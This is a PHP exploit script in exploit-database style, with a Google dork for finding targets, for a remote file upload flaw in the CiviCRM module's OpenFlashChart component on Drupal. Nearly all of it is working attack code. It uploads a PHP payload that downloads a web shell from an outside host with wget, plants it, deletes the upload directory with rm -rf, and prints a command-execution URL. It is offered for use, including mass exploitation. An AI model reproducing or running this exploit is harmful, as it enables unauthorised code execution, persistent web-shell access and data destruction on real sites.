# Exploit Title: Drupal civicrm module remote file upload exploit
# Google Dork:"Index of /sites/all/modules/civicrm/packages/OpenFlashChart/"
# Date: 20/04/2013
# Exploit Author: iskorpitx
# Vendor Homepage: http://civicrm.org
# Software Link: http://sourceforge.net/projects/civicrm/files/civicrm-stable/4.2.2/civicrm-4.2.2-drupal.tar.gz/download
# Version: [civicrm 4.2.2]
# Tested on: Win8 Pro x64 
# CVE : http://www.securityweb.org

<?php 
  
# Drupal module civicrm OpenFlashCart ofc_upload_image.php remote file upload exploit
# http://www.securityweb.org & http://www.security.biz.tr
# multithreading mass c:\appserv\www>exp.php -u http://target.com/ -f post.php
  
   
  
$options = getopt('u:f:'); 
  
if(!isset($options['u'], $options['f'])) 
die("\n        Usage example: php jnews.php -u http://target.com/ -f post.php\n 
-u http://target.com/    The full path to Drupal! 
-f post.php             The name of the file to create.\n");  
  
$url     =  $options['u']; 
$file    =  $options['f']; 


$shell = "{$url}sites/all/modules/civicrm/packages/OpenFlashChart/tmp-upload-images/{$file}"; 
$url   = "{$url}sites/all/modules/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name={$file}";  

  
$data      = '<?php 
 system("wget http://www.securityweb.org/shell.txt; mv shell.txt post.php");
 system("cp post.php ../../../../../../../tmp/post.php");
 system("cd ..; rm -rf tmp-upload-images");
 echo "by iskorpitx" ; 
 fclose ( $handle ); 
 ?>'; 
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 
'Content-Type: text/plain'); 
  
  
echo "        [+] Submitting request to: {$options['u']}\n"; 
  
  
$handle = curl_init(); 
  
curl_setopt($handle, CURLOPT_URL, $url); 
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers); 
curl_setopt($handle, CURLOPT_POSTFIELDS, $data); 
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); 
  
$source = curl_exec($handle); 
curl_close($handle); 
  
  
if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r')) 
{ 
echo "        [+] Exploit completed successfully!\n"; 
echo "        ______________________________________________\n\n        {$shell}?cmd=system('id');\n"; 
} 
else
{ 
die("        [+] Exploit was unsuccessful.\n"); 
} 
   
?>  